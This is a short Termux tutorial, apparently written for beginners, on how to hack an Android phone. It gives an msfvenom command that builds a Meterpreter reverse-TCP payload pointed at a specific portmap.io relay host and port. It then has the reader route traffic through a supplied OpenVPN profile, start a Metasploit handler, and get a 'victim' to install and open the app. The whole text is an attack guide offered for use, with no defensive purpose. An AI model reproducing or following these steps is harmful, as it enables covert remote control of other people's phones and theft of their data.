Note- run same as command in your termux 
  don't change any lhost or lport value because , it
  is manually set by us !
  don't enter your ip address or port 
    [ if you inter your ip and port so its only work on locally mean localhost - like - wifi or router
not on internet ) 
use our lhost  and lport its work on internet every time world wide !

step 1
creating payload [Android]
victim app
 ->    msfvenom -p android/meterpreter/reverse_tcp lhost=server8808-52768.portmap.io lport=25548 R >/sdcard
 
step 2  
download the app open vpn 
link -   
      .      download open.vpn app from playstore 
          1-  3 option ovpn profile and chose 
                the file connect.ovpn which i send to you
          2- ok all done
            3- after that you device connect with a 24×7     
                  network which work over internet
          4 - come down and see your private ip addres
                  mean this is your local ip after connect 
             5 - and your original port is 4444 don' t confuse

step 3  connect with app

 1-  open termux 
2- msfconsole 
3-  use/exploit/handler
  4  -   set -p android/meterpreter/reverse_tcp
5 - set lhost private ip
6 - set lport 4444 ( use default)
7 - exploit

step 4 send app in victim phone and install it and open it
  Enjoy unlockfull hacking!
